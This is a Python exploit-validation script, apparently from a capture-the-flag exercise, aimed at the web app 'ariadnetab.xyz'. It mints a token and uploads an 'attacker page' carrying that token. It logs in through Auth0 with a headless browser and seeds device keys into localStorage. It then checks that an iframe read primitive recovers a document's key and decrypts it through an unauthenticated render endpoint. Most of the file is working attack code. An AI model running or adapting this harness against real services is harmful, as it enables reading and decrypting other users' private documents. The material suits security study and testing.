#!/usr/bin/env python3
"""End-to-end check of the iframe read primitive, using only our own account.
A keyed iframe survives the 8 s channel timeout and is replaced onto the content origin.
We read cap and key from its fragment, then unauthenticated /api/render and AES-GCM decrypt the document."""
# Run: python localval.py (needs playwright and a Chrome binary at CHROME)

import json
import os
import re
import secrets
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import ari
import docs

CHROME = os.path.expanduser("~/.ctf/tools/chrome/chrome")
APP = "https://ariadnetab.xyz"
CONTENT = "https://content.ariadnetab.xyz"


def build_page(cfg):
    template = open(os.path.join(HERE, "frameread.html")).read()
    marker = re.search(r"/\*@@CFG@@\*/\s*\{.*?\};", template, re.S)
    if not marker:
        raise SystemExit("CFG marker not found in frameread.html")
    return template[: marker.start()] + "/*@@CFG@@*/ " + json.dumps(cfg) + ";" + template[marker.end():]


def main():
    state = ari.load_state()
    print("[*] minting a fresh access token")
    token = ari.get_token(state["email"], state["password"])["access_token"]
    state["access_token"] = token
    ari.save_state(state)
    keys = docs.ensure_keys(state)

    marker = "AGENT8-TARGET-" + secrets.token_hex(6)
    print(f"[*] uploading target document, marker {marker}")
    target, _ = docs.upload(state, "agent8-target.txt", "text/plain", marker.encode())
    target_id = target["id"]
    print(f"[*] target id {target_id}")

    control_id = "00000000-0000-4000-8000-" + secrets.token_hex(6)
    tag = "fr" + secrets.token_hex(2)
    cfg = {
        "tag": tag,
        "token": token,
        "targets": [target_id, control_id],
        "app": APP,
        "content": CONTENT,
        "lanes": 2,
        "deadline": 30000,
    }
    print(f"[*] uploading attacker page, tag {tag}, control {control_id}")
    page, _ = docs.upload(state, f"agent8-{tag}.html", "text/html", build_page(cfg).encode())
    viewer = docs.viewer_url(state, page["id"])
    print(f"[*] viewer {viewer[:80]}...")

    from playwright.sync_api import sync_playwright

    with sync_playwright() as pw:
        browser = pw.chromium.launch(executable_path=CHROME, headless=True,
                                     args=["--no-sandbox", "--disable-dev-shm-usage"])
        ctx = browser.new_context()
        page_obj = ctx.new_page()

        print("[*] seeding the device keypair into localStorage on the app origin")
        page_obj.goto(APP + "/", wait_until="domcontentloaded")
        page_obj.evaluate(
            "([priv, pub]) => { localStorage.setItem('rsaPrivateKeyPkcs8', priv);"
            " localStorage.setItem('rsaPublicKeySpki', pub); }",
            [keys["privateKey"], keys["publicKey"]],
        )

        print("[*] logging in through the real Auth0 universal login")
        page_obj.goto(APP + "/", wait_until="domcontentloaded")
        page_obj.wait_for_selector("#login:not([hidden])", timeout=30000)
        print("    -> sign-in button appeared, so start() survived the channel timeout")
        page_obj.click("#login")
        page_obj.wait_for_url(re.compile(r"auth0\.com"), timeout=30000)
        # Universal Login may be identifier-first, so handle a separate password page.
        page_obj.wait_for_selector("input#username", timeout=30000)
        page_obj.fill("input#username", state["email"])
        if page_obj.query_selector("input#password"):
            page_obj.fill("input#password", state["password"])
            page_obj.press("input#password", "Enter")
        else:
            page_obj.press("input#username", "Enter")
            page_obj.wait_for_selector("input#password", timeout=30000)
            page_obj.fill("input#password", state["password"])
            page_obj.press("input#password", "Enter")
        page_obj.wait_for_url(re.compile(r"^https://ariadnetab\.xyz/"), timeout=60000)
        page_obj.wait_for_timeout(4000)
        cached = page_obj.evaluate(
            "() => Object.keys(localStorage).filter(k => k.includes('auth0spajs')).length")
        print(f"    -> auth0 cache entries in localStorage: {cached}")

        print("[*] loading the attacker page on the content origin")
        page_obj.goto(viewer, wait_until="domcontentloaded")
        deadline = time.time() + 120
        last = ""
        while time.time() < deadline:
            page_obj.wait_for_timeout(1000)
            try:
                text = page_obj.inner_text("#log")
            except Exception:
                text = last
            if text != last:
                for line in text.split("\n")[len(last.split("\n")) if last else 0:]:
                    print("    " + line)
                last = text
            if "done hits=" in text:
                break

        print("\n===== page log =====")
        print(last)
        ok = marker in last
        print("\n[+] PRIMITIVE WORKS" if ok else "\n[-] primitive did not recover the plaintext")
        browser.close()
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
